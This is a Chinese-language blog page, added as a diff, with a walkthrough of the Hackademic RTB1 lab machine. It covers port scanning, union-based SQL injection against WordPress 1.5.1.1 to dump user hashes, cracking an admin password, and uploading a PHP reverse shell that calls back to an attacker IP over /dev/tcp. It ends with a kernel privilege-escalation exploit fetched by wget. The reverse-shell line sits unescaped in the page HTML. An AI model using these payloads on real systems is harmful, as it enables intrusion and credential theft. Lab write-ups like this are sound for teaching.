@@ -1,0 +1,646 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-undefined.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"acindm.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="Hackdamic靶机 靶机操作过程： 扫描虚拟机：   编辑虚拟机设置：       信息收集 Nmap扫描       可以看到开放的端口和对应的服务    Port service    22&#x2F;tcp ssh   80&#x2F;tcp web   Attempt to access port 80 1.3 scan information on web page   1.3.1P">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hackdamic靶机">
+<meta property="og:url" content="https://acindm.github.io/2023/10/18/Hackdamic%E9%9D%B6%E6%9C%BA/index.html">
+<meta property="og:site_name" content="acind の blog">
+<meta property="og:description" content="Hackdamic靶机 靶机操作过程： 扫描虚拟机：   编辑虚拟机设置：       信息收集 Nmap扫描       可以看到开放的端口和对应的服务    Port service    22&#x2F;tcp ssh   80&#x2F;tcp web   Attempt to access port 80 1.3 scan information on web page   1.3.1P">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="file:///C:/Users/lm/AppData/Local/Temp/ksohtml17332/wps77.jpg">
+<meta property="og:image" content="file:///C:/Users/lm/AppData/Local/Temp/ksohtml17332/wps78.jpg">
+<meta property="og:image" content="file:///C:/Users/lm/AppData/Local/Temp/ksohtml17332/wps79.jpg">
+<meta property="og:image" content="file:///C:/Users/lm/AppData/Local/Temp/ksohtml17332/wps80.jpg">
+<meta property="og:image" content="file:///C:/Users/lm/AppData/Local/Temp/ksohtml17332/wps81.jpg">
+<meta property="og:image" content="file:///C:/Users/lm/AppData/Local/Temp/ksohtml17332/wps82.jpg">
+<meta property="og:image" content="file:///C:/Users/lm/AppData/Local/Temp/ksohtml17332/wps83.jpg">
+<meta property="og:image" content="file:///C:/Users/lm/AppData/Local/Temp/ksohtml17332/wps84.jpg">
+<meta property="og:image" content="file:///C:/Users/lm/AppData/Local/Temp/ksohtml17332/wps85.jpg">
+<meta property="og:image" content="file:///C:/Users/lm/AppData/Local/Temp/ksohtml17332/wps86.jpg">
+<meta property="og:image" content="file:///C:/Users/lm/AppData/Local/Temp/ksohtml17332/wps87.jpg">
+<meta property="og:image" content="file:///C:/Users/lm/AppData/Local/Temp/ksohtml17332/wps88.jpg">
+<meta property="og:image" content="file:///C:/Users/lm/AppData/Local/Temp/ksohtml17332/wps89.jpg">
+<meta property="og:image" content="file:///C:/Users/lm/AppData/Local/Temp/ksohtml17332/wps90.jpg">
+<meta property="og:image" content="file:///C:/Users/lm/AppData/Local/Temp/ksohtml17332/wps91.jpg">
+<meta property="og:image" content="file:///C:/Users/lm/AppData/Local/Temp/ksohtml17332/wps92.jpg">
+<meta property="og:image" content="file:///C:/Users/lm/AppData/Local/Temp/ksohtml17332/wps93.jpg">
+<meta property="og:image" content="file:///C:/Users/lm/AppData/Local/Temp/ksohtml17332/wps94.jpg">
+<meta property="og:image" content="file:///C:/Users/lm/AppData/Local/Temp/ksohtml17332/wps95.jpg">
+<meta property="og:image" content="file:///C:/Users/lm/AppData/Local/Temp/ksohtml17332/wps96.jpg">
+<meta property="og:image" content="file:///C:/Users/lm/AppData/Local/Temp/ksohtml17332/wps97.jpg">
+<meta property="og:image" content="file:///C:/Users/lm/AppData/Local/Temp/ksohtml17332/wps98.jpg">
+<meta property="og:image" content="file:///C:/Users/lm/AppData/Local/Temp/ksohtml17332/wps99.jpg">
+<meta property="og:image" content="file:///C:/Users/lm/AppData/Local/Temp/ksohtml17332/wps100.jpg">
+<meta property="og:image" content="file:///C:/Users/lm/AppData/Local/Temp/ksohtml17332/wps101.jpg">
+<meta property="og:image" content="file:///C:/Users/lm/AppData/Local/Temp/ksohtml17332/wps102.jpg">
+<meta property="og:image" content="file:///C:/Users/lm/AppData/Local/Temp/ksohtml17332/wps103.jpg">
+<meta property="og:image" content="file:///C:/Users/lm/AppData/Local/Temp/ksohtml17332/wps104.jpg">
+<meta property="og:image" content="file:///C:/Users/lm/AppData/Local/Temp/ksohtml17332/wps105.jpg">
+<meta property="og:image" content="file:///C:/Users/lm/AppData/Local/Temp/ksohtml17332/wps106.jpg">
+<meta property="og:image" content="file:///C:/Users/lm/AppData/Local/Temp/ksohtml17332/wps107.jpg">
+<meta property="og:image" content="file:///C:/Users/lm/AppData/Local/Temp/ksohtml17332/wps108.jpg">
+<meta property="og:image" content="file:///C:/Users/lm/AppData/Local/Temp/ksohtml17332/wps109.jpg">
+<meta property="og:image" content="file:///C:/Users/lm/AppData/Local/Temp/ksohtml17332/wps110.jpg">
+<meta property="og:image" content="file:///C:/Users/lm/AppData/Local/Temp/ksohtml17332/wps111.jpg">
+<meta property="og:image" content="file:///C:/Users/lm/AppData/Local/Temp/ksohtml17332/wps112.jpg">
+<meta property="article:published_time" content="2023-10-18T07:41:58.000Z">
+<meta property="article:modified_time" content="2024-03-11T10:50:24.139Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="file:///C:/Users/lm/AppData/Local/Temp/ksohtml17332/wps77.jpg">
+
+<link rel="canonical" href="https://acindm.github.io/2023/10/18/Hackdamic%E9%9D%B6%E6%9C%BA/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Hackdamic靶机 | acind の blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">acind の blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">1</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">0</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">5</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://acindm.github.io/2023/10/18/Hackdamic%E9%9D%B6%E6%9C%BA/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png.jpg">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="Welcome to the 1/30000 🫧">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="acind の blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Hackdamic靶机
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-10-18 15:41:58" itemprop="dateCreated datePublished" datetime="2023-10-18T15:41:58+08:00">2023-10-18</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-03-11 18:50:24" itemprop="dateModified" datetime="2024-03-11T18:50:24+08:00">2024-03-11</time>
+              </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>1.2k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>5 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p><strong>Hackdamic靶机</strong></p>
+<p>靶机操作过程：</p>
+<p>扫描虚拟机：</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps77.jpg" alt="img"> </p>
+<p>编辑虚拟机设置：</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps78.jpg" alt="img"> </p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps79.jpg" alt="img"> </p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps80.jpg" alt="img"> </p>
+<p>信息收集</p>
+<p>Nmap扫描</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps81.jpg" alt="img"> </p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps82.jpg" alt="img"> </p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps83.jpg" alt="img"> </p>
+<p>可以看到开放的端口和对应的服务</p>
+<table>
+<thead>
+<tr>
+<th>Port</th>
+<th>service</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>22&#x2F;tcp</td>
+<td>ssh</td>
+</tr>
+<tr>
+<td>80&#x2F;tcp</td>
+<td>web</td>
+</tr>
+</tbody></table>
+<p>Attempt to access port 80</p>
+<p>1.3 scan information on web page</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps84.jpg" alt="img"> </p>
+<p>1.3.1Plug-in viewing framework</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.182.131/Hackademic_RTB1/?p=%E2%80%99%E2%80%A6%E2%80%99">http://192.168.182.131/Hackademic_RTB1/?p=’…’</a></p>
+<p><a target="_blank" rel="noopener" href="http://192.168.31.162/Hackademic_RTB1/?cat=1">http://192.168.182.131/Hackademic_RTB1&#x2F;?cat&#x3D;1</a></p>
+<p>考反弹shell</p>
+<p>使用dirsearch scan</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps85.jpg" alt="img"> </p>
+<p>没有结果，换一个路径</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps86.jpg" alt="img"> </p>
+<p>找到后台</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps87.jpg" alt="img"> </p>
+<p>有两种方法</p>
+<p>1.sql注入</p>
+<p>2.弱密码爆破</p>
+<p>查看网页源代码看看有没有cms的信息</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps88.jpg" alt="img"> </p>
+<p>我们直接看到这个cms是WordPress的1.5.1.1版本。然后可以searchsploit一下有啥漏洞：</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps89.jpg" alt="img"> </p>
+<p>重点观察版本匹配的开头两个，说存在<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=SQL%E6%B3%A8%E5%85%A5&spm=1001.2101.3001.7020">SQL注入</a>，因此接下来的渗透重点关注SQL注入</p>
+<p>尝试SQL注入吧，在参数最后加一个引号，把参数改为cat&#x3D;1’</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps90.jpg" alt="img"> </p>
+<p> 报错了，而且回显了数据库查询语句：</p>
+<p>SELECT * FROM wp_categories WHERE cat_ID &#x3D; 1\&#39; LIMIT 1</p>
+<p>先尝试获取数据库到底有多少列，通过order by [num]的方法（按照第[num]列排序），只要页面没有出现报错，就说明数据库至少有[num]列。order by 5是的界面如下：</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps91.jpg" alt="img"> </p>
+<p> order by 6时出现了报错，说明数据库中一共有5列数据：</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps92.jpg" alt="img"> </p>
+<p>接下来用联合查询的方法进行注入，思考SQL查询语句，要保证后台执行我们的联合查询union select语句，只要将cat_ID的值设置为0，这样就无法查询到结果，相当于只执行了union select的语句。如果将url中的参数改为cat&#x3D;0 union select 1,2,3,4,5那么SQL查询语句将会是：</p>
+<p>SELECT * FROM wp_categories WHERE cat_ID &#x3D; 0 union select 1,2,3,4,5 LIMIT 1</p>
+<p>LIMIT 1限制了只会显示一条结果，由于SELECT * FROM wp_categories WHERE cat_ID &#x3D; 0无法查询到结果，因此相当于只执行了select 1,2,3,4,5 LIMIT 1，界面如下：</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps93.jpg" alt="img"> </p>
+<p> 此处非常关键，注意上图中引号内的内容变为了2，因此select 1,2,3,4,5这个语句中2的位置可以进行查询，并回显到前端，我们可以把2修改为version()以查询MySQL的版本，这样参数修改为cat &#x3D; 0 union select 1,version(),3,4,5结果如下：</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps94.jpg" alt="img"> </p>
+<p>回显了版本</p>
+<p>由于WordPress是非常著名的cms，他的配置是固定的，可以Google查到WordPress1.5.1.1对应的数据库结构</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps95.jpg" alt="img"> </p>
+<p>找到了wordpress 1.5.1版本下存在的表的结构，有一个名为wp_users的表，下面有user_login,user_pass,user_level（用户名，密码，权限）等关心的列</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps96.jpg" alt="img"> </p>
+<p>select id,user_login,user_pass,user_level from wp-users</p>
+<p>比如可以查询user_login试试cat&#x3D;0 union select 1,user_login,3,4,5 from wp_users</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps97.jpg" alt="img"> </p>
+<p>成功查到了一天账号GeorgeMiller，但受限于LIMIT 1,我们只看到了这一个用户，此时可以用group_concat函数让一行内显示所有信息：</p>
+<p>cat&#x3D;0 union select 1,group_concat(user_login),3,4,5 from wp_users</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps98.jpg" alt="img"> </p>
+<p>把id，user_login，user_pass ，user_level这几个都注入出来</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps99.jpg" alt="img"> </p>
+<p>可以找到权限级别user_level最高的用户是GeorgeMiller，他的user_level是10，然后我们破解他的密码哈希7cbb3252ba6b7e9c422fac5334d22054</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps100.jpg" alt="img"> </p>
+<p>很容易得到是md5，然后找个在线网站Decrypt MD5, SHA1, MySQL, NTLM, SHA256, MD5 Email, SHA256 Email, SHA512, Wordpress, Bcrypt hashes for free online破解即可：</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps101.jpg" alt="img"> </p>
+<p>密码是q1w2e3</p>
+<p>下面通过用户名GeorgeMiller，密码q1w2e3登录WordPress后台</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps102.jpg" alt="img"> </p>
+<p>设置允许php文件上传</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps103.jpg" alt="img"> </p>
+<p>设置成功后，我们可以发现菜单中出现了Upload界面，我们可以上传一个反弹shell的php文件，即shell.php，代码如下，其中10.10.10.128是kali的ip，1234是一会接收shell的端口：</p>
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.128/1234 0>&1'"); ?><p>上传成功且路径是&#x2F;wp-content&#x2F;，下面只要开启nc监听，并访问&#x2F;wp-content&#x2F;shell.php即可接收到反弹shell：</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps104.jpg" alt="img"> </p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps105.jpg" alt="img"> </p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps106.jpg" alt="img"> nc监听成功收到了反弹shell</p>
+<p><em><strong>*最后进行内核提权*</strong></em></p>
+<p>先用python增强shell的交互性：</p>
+<p>python -c “import pty;pty.spawn(‘&#x2F;bin&#x2F;bash’)”</p>
+<p>查看当前用户：</p>
+<p>是apache，然后查看内核版本，是2.6.31：</p>
+<p>用sudo -l查看当前用户权限：</p>
+<p>很遗憾，需要密码。此路不通。</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps107.jpg" alt="img"> </p>
+<p> 由于22端口的SSH服务没有开放，所以对于提权来说，寻找SSH登录密码是没有意义的，而我们看到的内核版本又比较老旧，因此可采用内核提权的方法。在searchsploit中搜索Linux kernel 2.6.3版本的提权漏洞：</p>
+<p>searchsploit linux kernel 2.6.3 | grep -i ‘Privilege Escalation’ </p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps108.jpg" alt="img"> </p>
+<p>尝试15258.c，发现可以提权，过程如下，先把漏洞利用文件下载下来</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps109.jpg" alt="img"> </p>
+<p>然后把他传到靶机的&#x2F;tmp目录下，先在kali中启动一个http服务：</p>
+<p>php -S 0:80</p>
+<p>然后在靶机&#x2F;tmp目录下wget，把kali中的15285.c下载下来：</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps110.jpg" alt="img"> </p>
+<p>在靶机中用gcc编译，就直接命名为15285得了</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps111.jpg" alt="img"> </p>
+<p> 然后直接运行即可提权</p>
+<p>进入&#x2F;root目录，查看key.txt</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps112.jpg" alt="img"> </p>
+<p>成功拿到了flag，至此打靶成功</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/10/18/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/" rel="prev" title="红日靶场">
+      <i class="fa fa-chevron-left"></i> 红日靶场
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt=""
+      src="/images/avatar.png.jpg">
+  <p class="site-author-name" itemprop="name"></p>
+  <div class="site-description" itemprop="description">Welcome to the 1/30000 🫧</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">5</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://stackoverflow.com/yourname" title="StackOverflow → https:&#x2F;&#x2F;stackoverflow.com&#x2F;yourname" rel="noopener" target="_blank"><i class="fab fa-stack-overflow fa-fw"></i>StackOverflow</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://github.com/acindm" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;acindm" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:acindd@yeah.net" title="E-Mail → mailto:acindd@yeah.net" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/yourname" title="Twitter(X) → https:&#x2F;&#x2F;twitter.com&#x2F;yourname" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter(X)</a>
+      </span>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder"></span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">6k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">23 分钟</span>
+</div>
+
+<!-- <br /> -->
+<!-- 网站运行时间的设置 -->
+<span id="timeDate">载入天数...</span>
+<!-- <span id="times">载入时分秒...</span> -->
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("10/8/2023 2:00:00");//此处修改你的建站时间或者网站上线时间
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); 
+        if(String(snum).length ==1 ){snum = "0" + snum;}
+        // var times = document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+        document.getElementById("timeDate").innerHTML = " 👾营业已经："+dnum+" 天 "+hnum + " 时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
